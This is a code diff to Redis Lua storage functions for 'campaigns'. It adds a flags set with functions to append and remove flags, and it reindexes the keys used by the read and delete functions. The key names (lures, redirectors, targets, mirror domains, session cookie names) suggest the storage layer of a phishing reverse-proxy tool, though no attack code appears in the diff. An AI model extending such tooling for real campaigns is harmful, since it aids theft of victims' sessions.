@@ -148,19 +148,20 @@ redis.register_function({
   Read full campaign
 --]]
 local function read_full_campaign(keys, args)
-  if #keys ~= 9 or #args ~= 0 then
+  if #keys ~= 10 or #args ~= 0 then
     return redis.error_reply('ERR Wrong function use')
   end
 
   local campaign_key = keys[1]
-  local campaign_session_cookie_names_key = keys[2]
-  local campaign_lock_key = keys[3]
-  local proxy_index_key = keys[4]
-  local target_index_key = keys[5]
-  local redirector_index_key = keys[6]
-  local lure_index_key = keys[7]
-  local session_history_key = keys[8]
-  local message_history_key = keys[9]
+  local campaign_lock_key = keys[2]
+  local campaign_flags_key = keys[3]
+  local campaign_session_cookie_names_key = keys[4]
+  local proxy_index_key = keys[5]
+  local target_index_key = keys[6]
+  local redirector_index_key = keys[7]
+  local lure_index_key = keys[8]
+  local session_history_key = keys[9]
+  local message_history_key = keys[10]
 
   if redis.call('EXISTS', campaign_key) ~= 1 then
     return nil
@@ -199,6 +200,7 @@ local function read_full_campaign(keys, args)
     new_session_expire = tonumber(values[8]),
     message_expire = tonumber(values[9]),
     is_locked = redis.call('EXISTS', campaign_lock_key),
+    flags = redis.call('SMEMBERS', campaign_flags_key),
     proxy_index = redis.call('ZCARD', proxy_index_key),
     target_index = redis.call('ZCARD', target_index_key),
     redirector_index = redis.call('ZCARD', redirector_index_key),
@@ -277,11 +279,11 @@ local function lock_campaign(keys, args)
       return redis.error_reply('ERR Wrong stash.' .. k)
     end
 
-    if k == 'lock_secret' and v == '' then
+    if (k == 'lock_secret') and v == '' then
       return redis.error_reply('ERR Wrong stash.' .. k)
     end
 
-    if k == 'lock_timeout' and v <= 0 then
+    if (k == 'lock_timeout') and v <= 0 then
       return redis.error_reply('ERR Wrong stash.' .. k)
     end
   end
@@ -429,22 +431,115 @@ redis.register_function({
 })
 
 --[[
+  Append campaign flag
+--]]
+local function append_campaign_flag(keys, args)
+  if #keys ~= 2 or #args ~= 1 then
+    return redis.error_reply('ERR Wrong function use')
+  end
+
+  local campaign_key = keys[1]
+  local campaign_flags_key = keys[2]
+
+  if redis.call('EXISTS', campaign_key) ~= 1 then
+    return redis.status_reply('NOT_FOUND Campaign not exists')
+  end
+
+  local stash = {
+    flag = args[1],
+  }
+
+  for k, v in pairs(stash) do
+    if not v then
+      return redis.error_reply('ERR Wrong stash.' .. k)
+    end
+
+    if (k == 'flag') and v == '' then
+      return redis.error_reply('ERR Wrong stash.' .. k)
+    end
+  end
+
+  if redis.call('SISMEMBER', campaign_flags_key, stash.flag) ~= 0 then
+    return redis.status_reply('OK Campaign flag already exists')
+  end
+
+  -- Point of no return
+
+  redis.call('SADD', campaign_flags_key, stash.flag)
+
+  return redis.status_reply('OK Campaign flag appended')
+end
+
+redis.register_function({
+  function_name = 'append_campaign_flag',
+  callback = append_campaign_flag,
+  description = 'Append campaign flag',
+})
+
+--[[
+  Remove campaign flag
+--]]
+local function remove_campaign_flag(keys, args)
+  if #keys ~= 2 or #args ~= 1 then
+    return redis.error_reply('ERR Wrong function use')
+  end
+
+  local campaign_key = keys[1]
+  local campaign_flags_key = keys[2]
+
+  if redis.call('EXISTS', campaign_key) ~= 1 then
+    return redis.status_reply('NOT_FOUND Campaign not exists')
+  end
+
+  local stash = {
+    flag = args[1],
+  }
+
+  for k, v in pairs(stash) do
+    if not v then
+      return redis.error_reply('ERR Wrong stash.' .. k)
+    end
+
+    if (k == 'flag') and v == '' then
+      return redis.error_reply('ERR Wrong stash.' .. k)
+    end
+  end
+
+  if redis.call('SISMEMBER', campaign_flags_key, stash.flag) == 0 then
+    return redis.status_reply('OK Campaign flag not exists')
+  end
+
+  -- Point of no return
+
+  redis.call('SREM', campaign_flags_key, stash.flag)
+
+  return redis.status_reply('OK campaign flag removed')
+end
+
+redis.register_function({
+  function_name = 'remove_campaign_flag',
+  callback = remove_campaign_flag,
+  description = 'Remove campaign flag',
+})
+
+--[[
   Delete campaign
 --]]
 local function delete_campaign(keys, args)
-  if #keys ~= 9 or #args ~= 1 then
+  if #keys ~= 10 or #args ~= 1 then
     return redis.error_reply('ERR Wrong function use')
   end
 
   local campaign_key = keys[1]
   local campaign_lock_key = keys[2]
-  local campaign_mirror_domains_key = keys[3]
-  local campaign_session_cookie_names_key = keys[4]
-  local campaign_index_key = keys[5]
-  local proxy_index_key = keys[6]
-  local target_index_key = keys[7]
-  local redirector_index_key = keys[8]
-  local lure_index_key = keys[9]
+  local campaign_flags_key = keys[3]
+  local campaign_mirror_domains_key = keys[4]
+  local campaign_session_cookie_names_key = keys[5]
+  local campaign_index_key = keys[6]
+  local proxy_index_key = keys[7]
+  local target_index_key = keys[8]
+  local redirector_index_key = keys[9]
+  local lure_index_key = keys[10]
 
   if redis.call('EXISTS', campaign_key) ~= 1 then
     return redis.status_reply('NOT_FOUND Campaign not exists')
@@ -502,7 +597,7 @@ local function delete_campaign(keys, args)
 
   -- Point of no return
 
-  redis.call('DEL', campaign_key, campaign_lock_key)
+  redis.call('DEL', campaign_key, campaign_lock_key, campaign_flags_key)
 
   redis.call('SREM', campaign_mirror_domains_key, stash.mirror_domain)
 
